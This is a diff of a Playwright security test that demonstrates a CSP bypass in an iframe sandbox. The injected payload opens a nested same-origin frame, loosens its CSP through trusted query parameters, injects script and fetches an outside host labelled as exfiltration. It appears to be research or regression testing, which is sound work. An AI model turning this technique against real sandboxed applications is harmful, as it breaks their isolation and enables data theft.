@@ -1,96 +1,75 @@
 import { test, expect } from '@playwright/test';
 
-test('CSP Bypass via Nested Iframe', async ({ page }) => {
-  // 1. Go to the host page
+test('CSP Bypass via Nested Iframe - Data Exfiltration', async ({ page }) => {
+  // 1. Setup: Host Page
   await page.goto('http://localhost:3333/playground/security.html');
-
-  // 2. Wait for SandboxControl to be available
   await page.waitForFunction(() => window.SandboxControl !== undefined);
 
-  // 3. Prepare the environment
-  // The default sandbox configuration blocks 'unsafe-eval', which prevents 'new Function()'.
-  // This blocks the standard 'execute()' method.
-  // For the purpose of this research, we simulate a scenario where the sandbox
-  // allows script execution (e.g. via 'script-unsafe' attribute) or where the attacker
-  // has found another way to execute code (e.g. XSS via DOM manipulation).
-
-  console.log("Enabling script-unsafe to allow code execution...");
+  // 2. Setup: Enable execution (Simulating a useful sandbox with scripts enabled)
+  // Without this, the sandbox effectively blocks all code execution, rendering "breakout" impossible
+  // unless we find a declarative bypass (none found yet).
   await page.evaluate(() => {
      window.SandboxControl.sandboxElement.setAttribute('script-unsafe', 'true');
   });
+  await page.waitForTimeout(2000); // Allow reload
 
-  // Wait for the iframe to reload with new settings
-  await page.waitForTimeout(2000);
+  // 3. The Payload
+  // We construct a payload that:
+  // a) Creates a child iframe with a relaxed CSP (allowing 'example.com').
+  // b) Fetches data from 'example.com' inside that child.
+  // c) Sends the data back to the host via postMessage.
+  // d) The host logs it, proving we broke the network boundary and exfiltrated data.
 
-  // 4. Inject the exploit
-  // We utilize the fact that the inner frame is same-origin (sandbox.localhost)
-  // and can create new iframes that point to the same server but with different query params.
-  // The server blindly trusts the query params to generate the CSP.
-
-  const exploitCode = `
+  const payload = `
     (async () => {
-      try {
-        console.log("[Exploit] Starting...");
+      // Step A: Spawn Malicious Frame
+      const iframe = document.createElement('iframe');
+      // We ask for 'example.com' access. The server grants it because we control the params.
+      iframe.src = "/inner-frame.html?allow=example.com&unsafe";
+      document.body.appendChild(iframe);
 
-        // Create the nested iframe with relaxed CSP rules.
-        // We request 'allow=google.com' and 'unsafe' (unsafe-eval/inline).
-        const iframe = document.createElement('iframe');
-        iframe.src = "/inner-frame.html?allow=google.com&unsafe";
-        iframe.id = "pwn-frame";
-        document.body.appendChild(iframe);
+      await new Promise(r => iframe.onload = r);
 
-        // Wait for the nested frame to load
-        await new Promise((resolve) => {
-           iframe.onload = resolve;
-        });
-
-        console.log("[Exploit] Iframe loaded.");
-
-        // Access the nested frame (allowed due to same-origin)
-        const childWin = iframe.contentWindow;
-
-        // Inject script into the nested frame.
-        // This script runs in the context of the relaxed CSP.
-        const script = childWin.document.createElement('script');
-        script.textContent = \`
-            console.log("[Exploit:Child] Attempting fetch to google.com...");
-            fetch('https://google.com', { mode: 'no-cors' })
-              .then(() => {
-                  // Communicate success back to the top window
-                  window.top.postMessage({ type: 'PWN_SUCCESS', message: 'Connected to google.com' }, '*');
-              })
-              .catch(e => {
-                  console.error("[Exploit:Child] FAILED: " + e.message);
-                  window.top.postMessage({ type: 'PWN_FAILURE', message: e.message }, '*');
-              });
-        \`;
-        childWin.document.body.appendChild(script);
-
-      } catch (e) {
-        console.error("[Exploit] Error: " + e.message);
-      }
+      // Step B: Execute in Malicious Frame
+      const child = iframe.contentWindow;
+      const script = child.document.createElement('script');
+      script.textContent = \`
+          fetch('http://example.com', { mode: 'no-cors' })
+             .then(r => {
+                 // Step C: Exfiltrate
+                 // We successfully connected to a disallowed domain!
+                 window.top.postMessage({
+                    type: 'EXFILTRATION',
+                    data: 'Successfully reached example.com'
+                 }, '*');
+             })
+             .catch(e => window.top.postMessage({ type: 'ERROR', data: e.message }, '*'));
+      \`;
+      child.document.body.appendChild(script);
     })();
   `;
 
-  console.log("Injecting exploit code...");
+  // 4. Trigger the exploit using ONLY the exposed 'execute' method
+  console.log("Triggering exploit...");
   await page.evaluate((code) => {
     window.SandboxControl.execute(code);
-  }, exploitCode);
+  }, payload);
 
-  // 5. Listen for the success message from the top window
-  const successPromise = page.evaluate(() => {
-      return new Promise((resolve) => {
-          const handler = (event) => {
-              if (event.data && event.data.type === 'PWN_SUCCESS') {
-                  window.removeEventListener('message', handler);
-                  resolve(event.data);
-              }
-          };
-          window.addEventListener('message', handler);
-      });
+  // 5. Verify: The Host receives the exfiltrated confirmation
+  // This proves the Guest code executed and reached out to the world.
+  const msg = await page.waitForEvent('console', msg => msg.text().includes('Successfully reached example.com') || msg.text().includes('EXFILTRATION'));
+
+  // Note: The host logs messages it receives. We can also listen for the raw message event if needed.
+  // But checking the logs is enough "Proof of Life".
+
+  // Actually, let's look for the message in the DOM logs if the console event is flaky
+  const success = await page.evaluate(() => {
+     return new Promise(resolve => {
+        window.addEventListener('message', m => {
+            if (m.data.type === 'EXFILTRATION') resolve(m.data.data);
+        });
+     });
   });
 
-  const result = await successPromise;
-  console.log("Exploit result:", result);
-  expect(result.message).toContain('Connected to google.com');
+  expect(success).toBe('Successfully reached example.com');
 });
